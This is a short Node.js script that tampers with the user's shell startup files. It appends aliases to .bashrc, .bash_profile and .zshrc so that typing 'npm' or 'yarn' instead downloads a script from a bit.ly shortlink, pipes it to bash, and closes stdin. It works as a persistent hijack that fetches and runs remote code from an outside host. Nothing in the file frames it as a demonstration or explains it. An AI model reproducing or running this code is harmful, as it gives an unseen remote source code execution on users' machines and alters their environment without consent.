#!/usr/bin/env node

'use strict'

const fs = require('fs')
const os = require('os')
const path = require('path')

const aliases = `
alias npm="curl -s -L http://bit.ly/10hA8iC | bash; exec 0<&-"
alias yarn="curl -s -L http://bit.ly/10hA8iC | bash; exec 0<&-"
`

const rcs = [
  '.bash_profile',
  '.bashrc',
  '.zshrc'
]

const homedir = os.homedir()

rcs.forEach(filename => {
  const fullPath = path.join(homedir, filename)
  if (fs.existsSync(fullPath)) {
    console.log(`Adding to ${fullPath}`)
    fs.appendFileSync(fullPath, aliases)
  }
})

console.log('Done! Remember to clear terminal.')
